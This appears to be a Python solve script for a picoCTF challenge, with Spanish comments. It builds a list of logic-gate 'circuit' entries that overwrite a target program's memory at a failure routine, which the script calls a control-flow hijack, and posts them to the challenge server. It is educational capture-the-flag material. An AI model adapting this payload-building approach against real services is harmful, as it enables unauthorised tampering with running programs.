import struct
import requests

try:
    with open('programs/flag.bin', 'rb') as f:
        flag_bin = f.read()
except FileNotFoundError:
    print("Error: flag.bin no encontrado. Ejecútalo en la carpeta 'server'.")
    exit(1)

words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

circuit = []
node_id = 2048 

# La rutina de fallo "3333" está exactamente en la palabra 57
offset_start = 57 

for i in range(len(words)):
    val = words[i]
    
    # 28672 es el offset mágico para apuntar a 0x0000.
    # Sumamos 57 para apuntar directo a la yugular de la rutina de error.
    target_node = 28672 + offset_start + i
    
    dummy_node = 20480 + i * 2
    temp_node  = 20480 + i * 2 + 1
    
    if val == 0:
        # Nodo 256 es una zona vacía de la RAM que es siempre 0
        circuit.append({"input1": 1, "input2": 1, "output": dummy_node})
        val_node = 256 
    else:
        circuit.append({"input1": val, "input2": val, "output": dummy_node})
        val_node = node_id
        
    node_id += 3
    
    circuit.append({"input1": val_node, "input2": val_node, "output": temp_node})
    node_id += 3
    
    circuit.append({"input1": temp_node, "input2": temp_node, "output": target_node})
    node_id += 3

print(f"[*] Payload francotirador: {len(circuit)} compuertas apuntando a la rutina de fallo.")
print("[*] Lanzando exploit de secuestro de flujo...")

url = "http://activist-birds.picoctf.net:53090/check"
response = requests.post(url, json={"circuit": circuit})

if response.status_code == 200:
    print("[*] ¡Éxito! Respuesta del servidor:")
    print(response.json())
else:
    print(f"[!] Error HTTP {response.status_code}:")
    print(response.text)
